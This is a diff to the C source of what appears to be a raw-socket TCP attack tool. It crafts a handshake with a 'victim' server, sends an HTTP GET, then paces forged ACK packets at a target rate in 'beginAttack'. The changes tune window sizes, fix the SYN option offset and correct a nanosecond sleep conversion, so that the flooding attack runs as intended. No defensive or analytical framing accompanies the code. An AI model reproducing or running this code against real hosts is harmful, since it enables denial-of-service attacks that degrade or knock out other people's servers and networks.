@@ -21,7 +21,7 @@
 #define wscale (4)
 #define client_bw (1544000.0)
 #define maxwindow (240000)
-#define min_wait (0.000248704663)
+#define min_wait (0.00024870466321243526)
 
 //Pseudo header needed for calculating the TCP header checksum
 struct pseudoTCPPacket {
@@ -146,9 +146,9 @@ int send_packet(int socket,
     tcpHdr = (struct tcphdr *) packet;
     if (syn) {
       tcpopt = (unsigned *) (packet + sizeof(struct tcphdr));
-      data = (char *) (packet + sizeof(struct tcphdr) + 32);
+      data = (char *) (packet + sizeof(struct tcphdr) + 4);
 
-      packet_length = sizeof(struct tcphdr) + content_length + 32;
+      packet_length = sizeof(struct tcphdr) + content_length + 4;
       // set the wscale option
       unsigned tcp_wscale_kind = 3;
       unsigned tcp_wscale_len = 3;
@@ -284,7 +284,7 @@ void handshake(struct victim_connection *m_victim, int sock) {
     int w_scale = 0;
 	send_packet(sock,m_victim,send_seq,ack_nbr,
 				content,content_length,1,fin,rst,0,
-				window,w_scale);
+				46085,w_scale);
 	unsigned read_seq = read_packet(m_victim, sock);
   //printf("Received packet with sequence num: %u\n", read_seq);
   send_seq +=1;
@@ -293,12 +293,12 @@ void handshake(struct victim_connection *m_victim, int sock) {
   //printf("Handshake ack_nbr: %u, %ld, %ld",read_seq, ack_nbr, (long) read_seq + 1);
 	send_packet(sock,m_victim,send_seq,ack_nbr,
 				content,content_length,syn,fin,rst,1,
-				window,w_scale);
+				53270,w_scale);
 	content="GET / HTTP/1.0\r\n\r\n";
   content_length = strlen(content);
 	send_packet(sock,m_victim,send_seq,ack_nbr,
 				content,content_length,syn,fin,rst,1,
-				window,w_scale);
+				53270,w_scale);
 	m_victim->send_seq = send_seq + content_length;
 
 }
@@ -415,7 +415,7 @@ int beginAttack(int duration, double target_rate) {
                   0,                          // fin
                   0,                          // rst
                   1,                          // is_ack
-                  5840,                       // window
+                  53270,                      // window
                   0);                         // w_scale
 
       gettimeofday(&after_sent, NULL);
@@ -434,7 +434,7 @@ int beginAttack(int duration, double target_rate) {
 
       if (secsToWait > 0) {
           struct timespec rgtp;
-          double nanoToWait = secsToWait * 1E-9;
+          double nanoToWait = secsToWait * 1E9;
           rgtp.tv_sec = 0;
           rgtp.tv_nsec = nanoToWait;
           nanosleep(&rgtp, NULL);
@@ -463,7 +463,7 @@ int beginAttack(int duration, double target_rate) {
                 1,                            // fin
                 0,                            // rst
                 0,                            // is_ack
-                5840,                         // window
+                53270,                        // window
                 0);                           // w_scale
 
     pthread_join(tid, NULL);
